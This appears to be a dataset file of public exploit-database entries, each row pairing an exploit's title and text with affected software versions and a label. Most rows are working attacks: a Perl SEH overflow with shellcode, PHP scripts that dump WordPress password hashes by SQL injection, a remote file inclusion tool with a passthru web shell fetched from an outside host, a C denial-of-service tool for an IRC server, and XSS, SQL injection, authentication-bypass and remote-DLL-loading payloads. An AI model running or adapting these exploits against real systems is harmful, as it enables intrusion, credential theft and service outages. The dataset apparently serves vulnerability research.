17735,"Yahoo! player 1.5 - '.m3u' Universal Buffer Overflow (SEH) #!/usr/bin/perl # Exploit Title: yahoo! player 1.5  (.m3u) Universal Buffer Overflow (SEH) # Date: 27/08/2011 # Author: D3r K0n!G # Software Link: http://www.clubic.com/lancer-le-telechargement-8059-0-yahoo-player.html # Version: 1.5.01.409 # Tested on: Windows XP SP3 # CVE : N/A # Greets to: All my frends (DZ) & all members of www.se4ever.com & www.h4kz.net  my $file = ""yahoo.m3u""; my $junk = ""\x41"" x 2049; my $nexseh = ""\xeb\x10\x90\x90"";		# Short jump my $seh = pack ('V',0x300117f7);		# POP POP RET  => DUNZIP32.dll my $junk2 = ""\x90"" x 12; #windows/exec EXITFUNC=seh CMD=calc.exe R | msfencode -e x86/alpha_upper -t c  $shellcode = ""\x89\xe5\xd9\xc2\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49\x49\x43"". ""\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"". ""\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"". ""\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"". ""\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58\x4b\x39\x43\x30"". ""\x45\x50\x43\x30\x45\x30\x4c\x49\x5a\x45\x56\x51\x49\x42\x52"". ""\x44\x4c\x4b\x50\x52\x56\x50\x4c\x4b\x51\x42\x54\x4c\x4c\x4b"". ""\x56\x32\x54\x54\x4c\x4b\x52\x52\x56\x48\x54\x4f\x4f\x47\x50"". ""\x4a\x56\x46\x56\x51\x4b\x4f\x56\x51\x49\x50\x4e\x4c\x47\x4c"". ""\x43\x51\x43\x4c\x54\x42\x56\x4c\x47\x50\x4f\x31\x58\x4f\x54"". ""\x4d\x43\x31\x49\x57\x4b\x52\x4c\x30\x56\x32\x50\x57\x4c\x4b"". ""\x56\x32\x52\x30\x4c\x4b\x51\x52\x47\x4c\x43\x31\x58\x50\x4c"". ""\x4b\x51\x50\x43\x48\x4b\x35\x4f\x30\x54\x34\x51\x5a\x43\x31"". ""\x4e\x30\x56\x30\x4c\x4b\x51\x58\x45\x48\x4c\x4b\x56\x38\x47"". ""\x50\x43\x31\x49\x43\x5a\x43\x47\x4c\x47\x39\x4c\x4b\x56\x54"". ""\x4c\x4b\x43\x31\x49\x46\x50\x31\x4b\x4f\x50\x31\x4f\x30\x4e"". ""\x4c\x4f\x31\x58\x4f\x54\x4d\x45\x51\x58\x47\x50\x38\x4d\x30"". ""\x54\x35\x4c\x34\x45\x53\x43\x4d\x4b\x48\x47\x4b\x43\x4d\x51"". ""\x34\x52\x55\x4d\x32\x50\x58\x4c\x4b\x50\x58\x51\x34\x45\x51"". ""\x49\x43\x52\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x56\x38\x45"". ""\x4c\x43\x31\x4e\x33\x4c\x4b\x43\x34\x4c\x4b\x45\x51\x58\x50"". ""\x4d\x59\x50\x44\x47\x54\x51\x34\x51\x4b\x51\x4b\x45\x31\x56"". ""\x39\x50\x5a\x56\x31\x4b\x4f\x4b\x50\x51\x48\x51\x4f\x50\x5a"". ""\x4c\x4b\x45\x42\x5a\x4b\x4d\x56\x51\x4d\x52\x4a\x45\x51\x4c"". ""\x4d\x4b\x35\x4f\x49\x43\x30\x45\x50\x43\x30\x56\x30\x45\x38"". ""\x56\x51\x4c\x4b\x52\x4f\x4c\x47\x4b\x4f\x4e\x35\x4f\x4b\x4b"". ""\x4e\x54\x4e\x50\x32\x5a\x4a\x45\x38\x49\x36\x4d\x45\x4f\x4d"". ""\x4d\x4d\x4b\x4f\x4e\x35\x47\x4c\x45\x56\x43\x4c\x45\x5a\x4d"". ""\x50\x4b\x4b\x4b\x50\x54\x35\x54\x45\x4f\x4b\x50\x47\x54\x53"". ""\x52\x52\x52\x4f\x43\x5a\x45\x50\x56\x33\x4b\x4f\x49\x45\x43"". ""\x53\x45\x31\x52\x4c\x43\x53\x56\x4e\x45\x35\x54\x38\x45\x35"". ""\x45\x50\x41\x41""; open($File, "">$file""); print $File $junk.$nexseh.$seh.$junk2.$shellcode; close($FILE);",['1.5'],1
10751,"Dream4 Koobi Pro 6.1 Gallery - 'img_id' SQL Injection ########################################## # # Koobi Pro v6.1 gallery (img_id) #  ########################################## # ##AUTHOR : BILGE_KAGAN # ####HOME : http://www.1923turk.biz # ########################################### # # DORK 1 : allinurl: ""index.php?p=gallerypic img_id""  ########################################### EXPLOiT:  index.php?p=gallerypic&img_id=-1+union+select+0,1,2,concat(email,0x3a,pass),4,5,6,7,8+from+kpro6_user   aDM&#65533;N PANEL&#65533;:  admin/login.php",['6.1 Gallery'],1
6747,"WordPress Plugin WP Comment Remix 1.4.3 - SQL Injection <?php 	/** 	 * WP Comment Remix 1.4.3 SQL Injection 	 * Proof of Concept 	 * By g30rg3_x <g30rg3x_at_chxsecurity_dot_org> 	 * 	 * Advisory: 	 * http://chxsecurity.org/advisories/adv-3-full.txt 	 * 	 * PoC Mirror: 	 * http://chxsecurity.org/proof-of-concepts/wp-comment-remix-143.zip 	 * 	 * Attention: 	 * This is a Proof-of-Concept it was never intended to be fully functional 	 * 	 * Notes: 	 * Uses cURL 	 */  	// Script Header 	function head() { 		print ""\n WP Comment Remix 1.4.3 SQL Injection""; 		print ""\n By g30rg3_x <g30rg3x_at_chxsecurity_dot_org>""; 		print ""\n ------------------------------------------------""; 		print ""\n This is a Proof-of-Concept it was never intended to be fully functional\n""; 	}  	// Usage Information 	function usage() { 		global $argv; 		head(); 		print ""\n Usage: php {$argv[0]} <host> <path> <information> <table-prefix>\n""; 		print ""\n  <host>: Hostname or IP Address""; 		print ""\n  <path>: Path to WordPress (Defaults to: /)""; 		print ""\n  <information>: Information to Extract (Defaults to: relevant)""; 		print ""\n    dbinfo = Extract MySQL Current User, Database and Version""; 		print ""\n    admins = Extract Only Admins (users with level 10)""; 		print ""\n    users = Extract All Users (includes admins)""; 		print ""\n    options = Extract Relevant Options like active_plugins, secret, ...""; 		print ""\n    alloptions = Extrac All Options (Huge data would be directly printed out!)""; 		print ""\n    relevant = dbinfo + admins + options""; 		print ""\n    all = dbinfo + users + alloptions""; 		print ""\n  <table-prefix>: WordPress Tables Prefix (Defaults to: wp_)\n""; 		print ""\n Examples:""; 		print ""\n  php {$argv[0]} foo.bar""; 		print ""\n  php {$argv[0]} foo.bar /wordpress/""; 		print ""\n  php {$argv[0]} foo.bar /wordpress/ all foo_""; 		print ""\n""; 		exit(); 	}  	// cURL HTTP GET 	function GET($url) { 		$ch = curl_init($url); 		curl_setopt($ch, CURLOPT_HEADER, true); 		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: Close')); 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 		curl_setopt($ch, CURLOPT_USERAGENT, 'WP-Comment-Remix 1.4.3 SQL Injection Proof-of-Concept'); 		$result = curl_exec($ch); 		curl_close($ch);  		if ( preg_match('%HTTP/[0-9.x]+ 200 OK%', $result) ) 			return $result; 		else 			return false; 	}  	// Obtain Database Information 	function obtainDBInfo() { 		global $prefix, $url; 		$injection = '/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(0x757365727B,user(),0x7D44427B,database(),0x7D76657273696F6E7B,version(),0x7D),10,11,12,13,14,15--'; 		$result = GET($url . $injection); 		preg_match_all('/user\{(?P<user>.+)\}DB\{(?P<DB>.+)\}version\{(?P<version>.+)\}/', $result, $captured, PREG_PATTERN_ORDER); 		$db['user'] = $captured['user'][0]; 		$db['name'] = $captured['DB'][0]; 		$db['version'] = $captured['version'][0]; 		return $db; 	}  	// Obtain WordPress Users Information 	function obtainUsersInfo($all = false) { 		global $prefix, $url; 		$injection = ""/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(0x757365727B,{$prefix}users.user_login,0x7D706173737B,{$prefix}users.user_pass,0x7D),10,11,12,13,14,15/**/FROM/**/{$prefix}users"" . ( $all ? '' : "",{$prefix}usermeta/**/WHERE/**/{$prefix}users.ID={$prefix}usermeta.user_id/**/AND/**/{$prefix}usermeta.meta_key/**/REGEXP/**/0x757365725F6C6576656C/**/AND/**/{$prefix}usermeta.meta_value=10"" ) . '--'; 		$result = GET($url . $injection); 		preg_match_all('/user\{(?P<user>.+)\}pass\{(?P<pass>.+)\}/', $result, $captured, PREG_PATTERN_ORDER); 		for( $i = 0; $i < count($captured['user']); $i++ ) 			$users[$captured['user'][$i]] = $captured['pass'][$i]; 		return $users; 	}  	// Obtain WordPress Options Information 	function obtainOptionsInfo($all = false) { 		global $prefix, $url; 		$injection = ""/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(option_name,0x7B7C,option_value,0x7C7D),10,11,12,13,14,15/**/FROM/**/{$prefix}options"" . ( $all ? '' : '/**/WHERE/**/option_name/**/REGEXP/**/0x7369746575726C7C6C6F67696E7C757365727C706173737C617574687C7365637265747C73616C747C6163746976655F706C7567696E737C73656564' ) . '--'; 		$result = GET($url . $injection); 		preg_match_all('%<p>(?P<name>.+)\{\|(?P<value>.+)\|\}</p>%', $result, $captured, PREG_PATTERN_ORDER); 		for( $i = 0; $i < count($captured['name']); $i++ ) 			$options[$captured['name'][$i]] = $captured['value'][$i]; 		return $options; 	}  	// Set no time limit (only if safe mode is off) 	if ( !ini_get('safe_mode') ) 		set_time_limit(0);  	// Print usage if there is no host 	if ( !isset($argv[1]) ) 		usage();  	// Header, Arguments and Generate URL 	head(); 	$host = $argv[1]; 	$path = isset($argv[2]) ? $argv[2] : '/'; 	$info = isset($argv[3]) ? $argv[3] : 'relevant'; 	$prefix = isset($argv[4]) ? $argv[4] : 'wp_'; 	$url = 'http://' . $host . $path . 'wp-content/plugins/wp-comment-remix/ajax_comments.php?p=0';  	// Check if we can reach ""ajax_comments.php"" 	print ""\n Does ajax_comments.php exist? ... ""; 	$result = GET($url); 	if ( !$result ) { 		print ""No""; 		print ""\n -----------------------------------------------------------""; 		print ""\n Seems that the site does not have WP Comment Remix installed""; 		print ""\n OR the path you proportionate is incorrect.""; 		print ""\n Please review your arguments and try again.\n""; 		exit(); 	} 	print 'Yes';  	// Check if is it possible to inject... 	// ToDo: Some WordPress installations return more than 15 columns (this is caused by some plugins that alter 	// the comments table structure and don't revert back this change) so this injection may fail A LOT in a non-default 	// enviroment (ie. sites with many plugins), so if you REALLY want this PoC to be more ""functional"" then improve 	// this part of the PoC; it was never my intention to deliver a ""fully functional"" Proof-of-Concept. 	print ""\n Can we Inject SQL Code? ... ""; 	$result = GET($url . '/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'); 	if ( preg_match('/There are no comments for this post/', $result) ) { 		print ""No""; 		print ""\n --------------------------------------""; 		print ""\n Seems that the host is already patched.\n""; 		exit(); 	} 	print 'Yes';  	// Check table prefix but don't check if the user selected to obtain database information. 	if ( $info != 'dbinfo') { 		print ""\n Is \""{$prefix}\"" the table prefix? ... ""; 		$result = GET($url . ""/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15/**/FROM/**/{$prefix}users--""); 		if ( preg_match('/There are no comments for this post/', $result) ) { 			print ""No""; 			print ""\n ------------------------------------------------""; 			print ""\n Seems that the table prefix \""{$prefix}\"" is incorrect.""; 			print ""\n But this time we are not exiting, cause we can still extract""; 			print ""\n the database information, so m just going to change your choice""; 			print ""\n to dbinfo so you can still get that valuable information.""; 			print ""\n ------------------------------------------------\n""; 			$info = 'dbinfo'; 		} else { 			print 'Yes'; 		} 	}  	// Now is time to inject 	print ""\n\n Seems that everything is fine so now it's super fun time :P...""; 	switch($info) { 		case 'all': 			$db = obtainDBInfo(); 			$users = obtainUsersInfo(true); 			$options = obtainOptionsInfo(true); 			break; 		case 'relevant': 			$db = obtainDBInfo(); 			$users = obtainUsersInfo(); 			$options = obtainOptionsInfo(); 			break; 		case 'dbinfo': 			$db = obtainDBInfo(); 			break; 		case 'admins': 			$users = obtainUsersInfo(); 			break; 		case 'users': 			$users = obtainUsersInfo(true); 			break; 		case 'options': 			$options = obtainOptionsInfo(); 			break; 		case 'alloptions': 			$options = obtainOptionsInfo(true); 			break; 	}  	/* It's Show Time */  	// Database Information 	if ( !empty($db) ) { 		print ""\n\n Database Information""; 		print ""\n ---------------------""; 		print ""\n MySQL User: {$db['user']}""; 		print ""\n MySQL Version: {$db['version']}""; 		print ""\n MySQL Database Name: {$db['name']}""; 	}  	// Users Information 	if ( !empty($users) ) { 		print ""\n\n Users""; 		print ""\n ---------""; 		foreach( (array) $users as $user => $pass ) { 			print ""\n Username: {$user}""; 			print ""\n Password: {$pass}  "" . ( strlen($pass) <= 32 ? '(MD5)' : '(Passhash)' ); 			print ""\n ---------""; 		} 	}  	// Options Information 	if ( !empty($options) ) { 		print ""\n\n Options""; 		print ""\n ---------""; 		foreach( (array) $options as $name => $value ) { 			print ""\n Name: {$name}""; 			print ""\n Value: {$value}""; 			print ""\n ---------""; 		} 	}  	// Good Bye =) 	print ""\n\n Have Fun! =)\n""; ?>  # milw0rm.com [2008-10-14]",['1.4.3'],1
25070,"ngIRCd 0.6/0.7/0.8 - Remote Buffer Overflow // source: https://www.securityfocus.com/bid/12397/info  ngIRCd is reported prone to a remote buffer overflow vulnerability. This issue presents itself because the application fails to perform proper boundary checks before copying user-supplied data into process buffers.  A successful attack may allow the attacker to crash the server or gain unauthorized access to a vulnerable computer.  ngIRCd 0.8.1 and prior versions are affected by this vulnerability.   /*       NGircd <= 0.8.1     Remote Denial Of Service       Coded by: Expanders        Usage:  ./ngircd_dos <Host> <Ip> <NickToUse> <ChannellToJoin>     NOTE:  The channel must be EMPTY to let the exploit use +I mode        Example:  */  #include <stdio.h> #include <string.h> #include <netdb.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  void help(char *program_name);   int main(int argc, char *argv[]) {      struct sockaddr_in trg;      struct hostent *he;  long addr;      int sockfd, buff,rc;  char evilbuf[1024];  char buffer[1024];  char *nick=""AntiServer"";  char *channel=""Die_NGircd"";  char *request;  if(argv[3] != NULL) nick=argv[3];  if(argv[4] != NULL) channel=argv[4];  if(argc < 3 ) {   help(argv[0]);   exit(0);  }  printf(""\n\n-=[ NGircd <= 0.8.1 Remote DoS ::: Coded by Expanders ]=-\n"");      he = gethostbyname(argv[1]);      sockfd = socket(AF_INET, SOCK_STREAM, 0);      request = (char *) malloc(12344);      trg.sin_family = AF_INET;      trg.sin_port = htons(atoi(argv[2]));      trg.sin_addr = *((struct in_addr *) he->h_addr);      memset(&(trg.sin_zero), '\0', 8);  printf(""\n\nConnecting to target \t..."");  rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));  if(rc==0)  {   printf(""[Done]\nBuilding evil buffer\t..."");   memset(evilbuf,65,300);   memset(evilbuf+300,64,1);   memset(evilbuf+301,65,128);   printf(""[Done]\nSending NICK           \t..."");   sprintf(request,""NICK %s\n"",nick);   send(sockfd,request,strlen(request),0);   printf(""[Done]\nSending USER           \t..."");   sprintf(request,""USER %s x0n3-h4ck.org eth0.x0n3-h4ck.org :%s\n"",nick,nick);   send(sockfd,request,strlen(request),0);   buff=recv(sockfd, buffer, 256, 0);   printf(""[Done]\nJoining Channel        \t..."");   sprintf(request,""JOIN #%s\n"",channel);   send(sockfd,request,strlen(request),0);   printf(""[Done]\nSending evil request   \t..."");   sprintf(request,""MODE #%s +I %s\n"",channel,evilbuf);   send(sockfd,request,strlen(request),0);   sprintf(request,""QUIT www.x0n3-h4ck.org\n"",evilbuf);   send(sockfd,request,strlen(request),0);   sleep(2);   printf(""[Done]\nTrying to reconnect\t..."");   close(sockfd);   sockfd = socket(AF_INET, SOCK_STREAM, 0);   sleep(1);   rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));   if(rc==0)    printf(""[Fail] -> Damn! Attack Failed!\n\n"");   else    printf(""[Done] -> Attack Success! Lets party!\n\n"");  }  else   printf(""[Fail] -> Unable to connect\n\n"");  close(sockfd);  return 0;  }  void help(char *program_name) {   printf(""\n\t-=[      NGircd <= 0.8.1 Remote Denial Of Service      ]=-\n"");  printf(""\t-=[                                                    ]=-\n"");  printf(""\t-=[      Coded by ders -/www.x0n3-h4ck.org\\-      ]=-\n\n"");  printf(""Usage: %s <Host> <Ip> <NickToUse> <ChannellToJoin>\n"",program_name); }","['0.6/0.7/0.8', '0.8.1', 'prior versions']",1
2686,"phpBB Spider Friendly Module 1.3.10 - Remote File Inclusion #!/usr/bin/php -q -d short_open_tag=on <? print '     |                 \\\\     |                  \\\     |________   __________\____   ____.___ .____          |\______ \  \_   _____/\   \ /   /|   ||    |         | |    |  \  |    __)_  \   Y   / |   ||    |           |    `   \ |        \  \     /  |   ||    |___      |/_______  //_______  /   \___/   |___||_______ \     |        \/         \/    \\                   \/      ______________________   _\\__      _____        |\__    ___/\_   _____/  /  _  \    /     \       |  |    |    |    __)_  /  /_\  \  /  \ /  \      |  |    |    |        \/    |    \/    Y    \        |____|   /_______  /\____|__  /\____|__  / <---|--|----------------\/---------\/---------\/----/>     |  |                            \\\     |  | | | | |                     \\ //----------------------->     | DEVIL TEAM - POLISH TEAM        \\\/ http://www.rahim.webd.pl/ ___________              .__         ._\_ __    .__        _____        \_   _____/__  _________ |  |   ____ |__|/  |_  |__| _____/ ____\____    |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\ |  |/    \   __\/  _ \   |        \>    < |  |_> >  |_(  <_> )  ||  |   |  |   |  \  | (  <_> ) /_______  /__/\_ \|   __/|____/\____/|__||__|   |__|___|  /__|  \____/  <-------\/------\/|__|-----------------------\----------\/------------->     | | | | |                                 \\      | Spider Friendly <= 1.3.10 (phpbb_root_path) Remote File Include Exploit     |  - ------------------------------------------------------------ -  	| Spider Friendly 1.3.10 is a module of phpBB modified by Przemo 	     |   Script name ....: Spider Friendly 1.3.10         Release Date ..: 2006/10/29     |   Script site ....: http://www.przemo.org/phpBB2/forum/download.php?id=5767 	 	|   Dork ....: ""& Spider Friendly by Crack"" 	|   Usage: http://site.org/admin/modules_data.php?phpbb_root_path=[shell] 	|     |   Find by ....: Kacper (a.k.a Rahim)      |   (c)od3d by Kacper 	|   Autor Site: http://www.rahim.webd.pl/ 	|   Contact: kacper1964@yahoo.pl 	|   DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam <----------------------------------------------------------------------/>     |     | Greetings DragonHeart and all DEVIL TEAM Patriots :)     |   | Leito - Leon - TomZen - Gelo - Ramzes - DMX - Ci2u - Larry     |   |   | @steriod - Drzewko - CrazzyIwan - ARCLITE - Rammstein - Adam 	|   |   |   | Kicaj - DeathSpeed - Arkadius - Michas - pepi - nukedclx     |   |   | SkD - MXZ - sysios - mIvus - wacky 	|   |   |   |   |   Greetings for 4ll Fusi0n Group mambers ;-) <---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---/>  ';  if ($argc<4) { print (' -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Usage: php '.$argv[0].' host shell cmd OPTIONS host:      script server (ip/hostname) shell:     path to shell cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' localhost http://www.evilsite.com/shell.txt ls -la -P1.1.1.1:80 shell.txt: <?php ob_clean();echo""Hacker_Kacper_Made_in_Poland!!..Hauru..^_^..the..best..polish..team..Greetz"";ini_set(""max_execution_time"",0);echo ""hauru"";passthru($_GET[""cmd""]);die;?> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- '); die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpackets($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $shell=$argv[2]; $cmd="""";  $port=80; $proxy=""""; for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } }  if ($proxy=='') {$p='http://'.$host.':'.$port;}  $packet =""GET "".$p.""admin/modules_data.php?phpbb_root_path="".$shell.""?cmd="".$cmd.""%00 HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpackets($packet); if (strstr($html,""hauru"")) { $temp=explode(""hauru"",$html); die($temp[1]); } echo ""Exploit err0r :(""; echo ""Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam""; ?>  # milw0rm.com [2006-10-30]",['1.3.10'],1
36934,SAP Business Objects InfoVew System - 'listing.aspx?searchText' Cross-Site Scripting source: https://www.securityfocus.com/bid/52361/info  SAP Business Objects is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  SAP Business Objects XI R2 is vulnerable; other versions may be affected.   http://www.example.com/businessobjects/enterprise115/InfoView/listing.aspx searchText=</script><script>alert(1);</script>,['XI R2'],1
28941,Immediacy .NET CMS 5.2 - 'Logon.aspx' Cross-Site Scripting source: https://www.securityfocus.com/bid/20965/info  Immediacy CMS is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 5.2 is vulnerable to this issue; other versions may also be affected.  http://www.example.com//logon.aspx?lang=<SCRIPT>alert('Can%20Cross%20Site%20Attack')</SCRIPT>,['5.2'],1
37965,"Keeper IP Camera 3.2.2.10 - Authentication Bypass # Exploit Title: Keeper IP Camera - Authentication Bypass # Date: 25/08/2015 # Exploit Author: RAT - ThiefKing # Vendor Homepage: http://www.keeper.cn/en/Camera-ip.asp # Version: 3.2.2.10 # WEB Version: 6.1.17.192 # Tested on: QB200W, QB130W, QA130W,...  Exploit: 1 - First, open your browser 2 - Enter the IP address or domain to see the login screen of the camera 3 - Now go to page umanage.asp (http://ipaddress:port/umanage.asp)  You can change or view passwords  TEST: http://server:88/login.asp --  RAT - ThiefKing http://tromcap.com",['3.2.2.10'],1
8215,"PPLive 1.9.21 - '/LoadModule' URI Handlers Argument Injection -------------------------------------------------------------------------------- PPLive <= 1.9.21 uri handlers ""/LoadModule"" remote argument injection by Nine:Situations:Group::strawdog -------------------------------------------------------------------------------- software site:http://www.pplive.com/en/index.html our site: http://retrogod.altervista.org/  software description: ""PPLive is a peer-to-peer streaming video network created in Huazhong University of Science and Technology, People's Republic of China. It is part of a new generation of P2P applications, that combine P2P and Internet TV, called P2PTV.""  vulnerability: The ""synacast://"", ""Play://"" ,""pplsv://"" and ""ppvod://"" URI handlers do not verify certain parts of the URI before evaluating command line parameters. This can be exploited against Internet Explorer to e.g. load a dll from a remote UNC path via the ""/LoadModule"" parameter, example exploit (IE7):  synacast://www.microsoft.com/?""%20/LoadModule%20\1.2.3.4\unc_share\sh.dll%20"" Play://www.microsoft.com/?""%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20""  against older versions: pplsv://www.microsoft.com/?""%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20"" ppvod://www.microsoft.com/?""%20/LoadModule%20\\1.2.3.4\unc_share\sh.dll%20""  test dll which adds new credentials / spawns the telnet server: http://retrogod.altervista.org/9sg_pplive_sh.html  some interesting readings: http://msdn.microsoft.com/en-us/library/aa767914(VS.85).aspx  --------------------------------------------------------------------------------  # milw0rm.com [2009-03-16]",['1.9.21'],1
25909,"Mensajeitor 1.8.9 - 'IP' HTML Injection source: https://www.securityfocus.com/bid/14071/info  Mensajeitor is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.  Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.   http://www.example.com/mensajeitor.php?nick=megabyte&url=http://mbytesecurity.org&actualizar=null&titulo=aaa&ip='aa'>%3Ciframe%20src=http://mbytesecurity.org/bukle.htm&enviar =Enviar <http://www.example.com/mensajeitor.php?nick=megabyte&url=http://mbytesecurity.org&actualizar=null&titulo=aaa&ip=%27aa%27%3E%3Ciframe%20src=http://mbytesecurity.org/bukle.htm &enviar=Enviar>",['1.8.9'],1
20492,"ssldump 0.9 b1 - Format String source: https://www.securityfocus.com/bid/2096/info  ssldump is a traffic analyzer for monitoring network traffic in real time. It is written and maintained by Eric Rescorla. A problem exists which could allow the arbitrary execution of code.  The problem exists in the ssldump handling of format strings. ssldump requires elevated privileges to listen to traffic crossing the network interface. While monitoring traffic, the encounter of format strings in a URL will cause the program to segmentation fault. Potentially, this could lead to the overwriting of stack variables and arbitrary execution of code with administrative access, if exploited by a malicious user.   1) Run SSLDUMP (needs you to be root unless setuid)  2)Open Up Netscape Navigator it)  3) Type the following in Netscape Navigator: fixme:%s%s%s%s%s%s  4) watch as ssldump with gather the traffic then segfault..",['0.9 b1'],1
32646,"TWiki 4.x - 'URLPARAM' Cross-Site Scripting source: https://www.securityfocus.com/bid/32669/info  TWiki is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   An HTML form field must exist containing an input value with specifying an encoding. As an example:  <input type=""text"" name=""city"" value=""%URLPARAM{ ""city"" }%"" />  THe following examples will then demonstrate this issue:  http://example.com/twiki/view/TWiki/WebSearch?search=%27a%20onmouseover=alert(document.cookie)%20%27  http://example.com/twiki/view/TWiki/ResetPassword?username=""<script language=Javascript>alert('3y3 0wn j00 TWIKI')</script>",['4.x'],1
6863,"PacketTrap TFTPD 2.2.5459.0 - Remote Denial of Service #!/usr/bin/perl # Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com] # PacketTrap TFTPD DoS (latest 2.2.5459.0 tested) -- www.packettrap.com # Must have Net::TFTP installed (easy to install, 'cpan' then 'install Net::TFTP' ;) # A product of tftpfuzz.pl (coming soon)  use Net::TFTP; use Getopt::Std;  $tftp = Net::TFTP->new(""192.168.0.112""); $tftp->ascii; $tftp->put(""test"", ""|"");  exit;  # milw0rm.com [2008-10-29]",['2.2.5459.0'],1
38955,"Command School Student Management System - '/sw/admin_subjects.php?id' SQL Injection source: https://www.securityfocus.com/bid/64707/info             Command School Student Management System is prone to the following security vulnerabilities:             1. Multiple SQL-injection vulnerabilities 2. A cross-site request forgery vulnerability 3. A cross-site scripting vulnerability 4. An HTML injection vulnerability 5. A security-bypass vulnerability             Exploiting these issues could allow an attacker to run malicious HTML and script codes, steal cookie-based authentication credentials, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, or bypass certain security restrictions to perform unauthorized actions.             Command School Student Management System 1.06.01 is vulnerable; other versions may also be affected.   http://www.example.com/sw/admin_subjects.php?action=edit&id=null+and+1=2+union+select+version()",['1.06.01'],1
